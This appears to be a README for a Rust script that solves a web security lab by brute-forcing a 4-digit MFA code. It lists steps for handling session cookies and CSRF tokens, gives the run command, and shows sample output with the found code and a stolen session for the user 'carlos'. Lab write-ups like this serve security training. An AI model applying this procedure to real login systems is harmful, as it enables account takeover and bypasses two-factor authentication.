# Hack Steps

1. GET /login page and extract the session from cookie header and csrf token from the body
2. POST /login with valid credentials, extracted session and the csrf token
3. Obtain the new session
4. GET /login2 with the new session
5. Extract the csrf token from the body of /login2
6. POST the mfa-code with the new session and the new extracted csrf token
7. Repeat the process with all possbile numbers 

# Run Script

1. Change the URL of the lab
2. Start script

```
~$ cargo run
```

# Expected Output

```
[#] Brute forcing the mfa-code of carlos..
[*] Elapsed: 30 minutes || Failed: 3 || (6034/10000) 1276 => Incorrect
✅ Correct code: 0345
✅ New session: HY4DM0kZP9d8iT1xyYflQ24blyH6y8Qx
Use this session in your browser to login as carlos

✅ Finished in: 30 minutes

[!] Failed codes count: 3 
[!] Failed codes: ["8136", "0137", "2134"]
```
